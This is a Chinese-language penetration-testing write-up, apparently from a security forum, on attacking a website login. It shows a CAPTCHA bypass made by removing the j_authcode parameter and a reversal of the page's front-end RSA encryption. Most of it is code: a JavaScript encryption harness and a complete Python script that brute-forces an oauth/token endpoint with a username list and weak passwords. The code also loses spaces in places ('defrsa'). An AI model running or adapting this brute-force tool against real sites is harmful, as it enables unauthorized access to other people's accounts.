某网站登录的时候如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-cb74758db11e49bc07bdff98b4139b89a8ae37dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-cb74758db11e49bc07bdff98b4139b89a8ae37dd.png)

然后我去掉`j_authcode`以及一些无用参数，可以绕过图形验证码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f63a3c5b521bf408584ab2b05d268c0f5632e5b2.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f63a3c5b521bf408584ab2b05d268c0f5632e5b2.png)

然后这样就可以进行爆破了。但是我们可以看到`username`和`password`均经过加密，这究竟是什么加密呢？我们来看看前端代码。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-56dda67491c9b454beac4e23ca332211c1d1e4ae.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-56dda67491c9b454beac4e23ca332211c1d1e4ae.png)

可以看到这里是RSA加密。然后通过断点查看`exponent`和`modulus`的值。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-05252dfe9c642445702e352f0085e5c64c29ad2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-05252dfe9c642445702e352f0085e5c64c29ad2f.png)

值是固定的，搜索后发现就存储在`config.js`中，也就是说RSA公钥为`modulus`。  
但这是一个256位公钥的RSA加密，在其他环境中几乎找不到这种加密项目，而js中有`RSA.js/Barrett.js/BigInt.js`这么一个早期项目。这种时候就需要用python去调js代码来进行加密。

先写出js加密的代码来看看效果：

```php
<script src="./rsa/RSA.js" type="text/javascript"></script>
<script src="./rsa/BigInt.js" type="text/javascript"></script>
<script src="./rsa/Barrett.js" type="text/javascript"></script>
<script src="./rsa/config.js" type="text/javascript"></script>
<script>
functiona(paramStr){
    setMaxDigits(130);
    key = new RSAKeyPair(exponent, "", modulus); 
    return encryptedString(key,encodeURIComponent(paramStr));
    }
qqq= a("admin");
alert(qqq);
</script>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e5b0fdf739e5559e9c96f6d8c81391f47efbdd49.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e5b0fdf739e5559e9c96f6d8c81391f47efbdd49.png)  
这里可以看到和Burp Suite里是一模一样，然后把4个js带html里的js代码合并在同一个文件里，用python的`execjs`库去调。

```php
import execjs

defrsa(str):
    file = 'RSA.js'
    ctx = execjs.compile(open(file).read())
    js = 'a("'+str+'")'
    params = ctx.eval(js)
    return params
print(rsa("admin"))
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e6b6ac8f6a490415da5f59398531fdcdc43a4e95.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e6b6ac8f6a490415da5f59398531fdcdc43a4e95.png)  
最后写出来爆破的脚本：

```php
import requests
import execjs

requests.packages.urllib3.disable_warnings()
defurlpost(username,password):
    rusername = rsa(username)
    rpassword = rsa(password)
    url = "https://x.com/oauth/token"
    header = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0)Gecko/20100101 Firefox/79.0",
          "X-Requested-With": "XMLHttpRequest",
          "Content-Type": "application/x-www-form-urlencoded"
          }
    cookie = {}
    data = {"username":rusername,
            "password":rpassword,
            "grant_type":"password",
            "scope":"service",
            "client_id":"spm",
            "client_secret":"sinoprof"
            }
    r =requests.post(url,cookies=cookie,headers=header,data=data,allow_redirects=False,verify=False)
    print(r.status_code)
    if r.status_code == 200:
        print(username+password+"success")
        exit()
    else:
        print(username+password+"error")

defrsa(str):
    file = 'RSA.js'
    ctx = execjs.compile(open(file).read())
    js = 'a("'+str+'")'
    params = ctx.eval(js)
    return params

folist= open('user.txt','r')
for i in folist.readlines():
    i = i.replace('\n','')
    urlpost(i,i+"!@#456")
    urlpost(i,i+"!@#123")
    urlpost(i,"123456")
```

最终效果如下图所示：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-620b4561cb25cc5ac0d24ff8c6b1a0debaebde29.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-620b4561cb25cc5ac0d24ff8c6b1a0debaebde29.png)